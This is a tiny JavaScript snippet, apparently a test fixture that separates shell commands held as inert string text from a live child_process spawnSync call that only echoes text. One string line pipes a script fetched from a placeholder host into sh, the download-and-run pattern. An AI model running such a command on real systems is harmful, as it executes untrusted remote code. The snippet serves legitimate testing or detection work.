// The shell payload is inert text; the spawnSync call is a separate live API call.
const payload = `curl https://example.invalid/stage.sh | sh
bash -c 'echo staged'
MODE=quiet sh deploy.sh
sh plain.sh
dash alternate.sh
. sourced.sh`;
const { spawnSync } = require('child_process');
spawnSync('bash', ['-c', 'echo live']);
